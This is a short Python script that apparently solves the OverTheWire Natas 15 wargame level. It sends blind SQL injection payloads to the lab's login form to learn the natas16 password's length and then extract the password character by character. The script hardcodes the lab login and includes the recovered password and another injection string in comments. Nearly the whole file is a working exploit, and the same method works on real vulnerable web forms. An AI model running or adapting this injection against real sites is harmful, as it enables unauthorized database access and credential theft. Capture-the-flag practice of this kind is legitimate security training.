import requests
from requests.auth import HTTPBasicAuth

url="http://natas15.natas.labs.overthewire.org"

charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

passwd=""

l=1
while True:
	d={'username':'natas16" AND length(password)="'+str(l)+'" -- '}
	r=requests.post(url,data=d,auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
	if "exists" in r.text:
		break
	l+=1

print "Size of password is: ",l

for i in range(0,l):
	for c in charset:
		d={'username':'natas16" AND password LIKE BINARY "'+passwd+c+'%" -- '}
		r=requests.post(url,data=d,auth=HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
		if "exists" in r.text:
			passwd=passwd+c
			print passwd
			break
	


# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

#natas16" and substring(password,1,1)="W" -- 
